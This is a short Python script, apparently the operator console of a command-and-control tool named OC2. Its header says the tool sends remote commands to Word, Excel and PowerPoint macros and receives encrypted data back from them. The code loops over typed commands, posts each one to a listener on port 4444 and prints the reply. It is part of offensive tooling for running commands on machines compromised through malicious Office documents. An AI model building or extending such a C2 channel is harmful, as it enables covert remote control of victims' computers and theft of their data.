# OC2 (Office Command and Control) allows you to send remote commands and receive encrypted data with a Word/Excel/PowerPoint Macro.
# Created by https://github.com/Splintaz/
import requests
import colorama
from colorama import Fore, Back, Style
from flask import Blueprint, request, Response
while True:
    dictToSend = input(Fore.CYAN + "> ") # String to send
    res = requests.post("http://0.0.0.0:4444/python", json=dictToSend)
    dictFromServer = res.json() 
    print(dictFromServer) # dictToReturn sends us the server string
